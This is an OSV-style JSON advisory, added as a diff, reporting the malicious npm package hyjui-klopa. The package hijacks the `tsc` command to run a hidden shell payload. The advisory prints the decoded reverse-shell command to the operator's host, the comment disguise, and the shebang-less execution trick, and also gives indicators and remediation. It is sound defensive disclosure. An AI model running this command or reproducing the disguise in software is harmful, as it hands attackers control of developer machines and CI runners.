@@ -1,0 +1,74 @@
+{
+  "schema_version": "1.7.4",
+  "published": "2026-11-25T15:43:57Z",
+  "modified": "2026-11-25T15:43:57Z",
+  "summary": "Malicious code in hyjui-klopa (npm): hijacks the `tsc` command and opens a reverse shell to 194.163.166.19:4445",
+  "details": "hyjui-klopa is part of the Ghost Compiler campaign, a cluster of npm packages published by the account `jikaya497` (jikaya497@gmail.com) between October and November 2026. The weaponized packages in this campaign register themselves as `tsc`, the TypeScript compiler command, and hide their payload in a file that reads as a JavaScript comment but runs as a shell script.\n\nHow it executes: `package.json` maps `bin.tsc` to `./index.js`, so installing the package links `node_modules/.bin/tsc` to that file. Whichever package is installed last owns that link, so installing hyjui-klopa after `typescript` replaces the real compiler. `index.js` has no shebang line and is marked executable (mode 0755). When a build script, CI step, editor or pre-commit hook runs `tsc`, the kernel cannot execute the file directly and the shell falls back to interpreting it as a shell script. The command substitution inside what a reviewer reads as a JavaScript comment then runs.\n\nPayload: the comment is disguised as Sentry error-reporting settings (`sentry_server=194.163.166.19; protocol=tcp; team=dev; members_id=4445; default=sh`) and expands to `sh -i >& /dev/tcp/194.163.166.19/4445 0>&1`. This connects an interactive shell, running as the user who ran the build, to the operator's host, giving the operator full control of the developer machine or CI runner. The package also ships a two-line `.ls` script (`id>a`) used as a capability probe elsewhere in the campaign.\n\nInfrastructure: 194.163.166.19 is the operator's command-and-control host. It also serves a self-hosted npm registry on port 4873 (`web.vitemaweed.fr`) that other packages from the same publisher pin their dependencies to, and the same reverse-shell command appears encrypted inside the publisher's package `juyip-parser-helper`.\n\nIndicators: `node_modules/.bin/tsc` resolving to any package other than `typescript`; outbound TCP connections to 194.163.166.19 on ports 4445 or 4873; a `bin`-exposed `.js` file with no shebang and mode 0755.\n\nAny machine that installed this package and then ran `tsc` should be treated as compromised: rotate all credentials reachable from that user or CI job and rebuild the host.",
+  "affected": [
+    {
+      "package": {
+        "name": "hyjui-klopa",
+        "ecosystem": "npm"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "index.js",
+              "sha256": "f71532fa4b7108c80a53ca3899b2ec81ad670f843721d277f2e619fec00234ac",
+              "tlsh": "c2f0dc90489fe379e08003705f0d7aa16b08cdbc4238215a5da4094b324986e20982ed"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "hyjui-klopa-1.0.0.tgz",
+              "hashes": {
+                "sha1": "ccf349665e8b3095705e66487b303dddaf6a0ec7",
+                "sha512_sri": "sha512-or2U+UbGYQCqii3AKn1V1QDGAp+xR0pNq/nf9/F5wGyekbh5lu4jmmontR+St+vqIRr8+XDBgCSgIIVa3s6jCw=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/hyjui-klopa/v/1.0.0"
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-023119",
+        "import_time": "2026-11-25T16:15:54.281655440Z",
+        "modified_time": "2026-11-25T15:43:57Z",
+        "sha256": "1dc7308ca9b59677cda2644cdac77b0a2ef7b73eb4120f60ea7a2009f6ca620d",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.0.0"
+        ]
+      }
+    ]
+  },
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "contact": [
+        "inspector-research@amazon.com"
+      ],
+      "type": "FINDER"
+    }
+  ]
+}
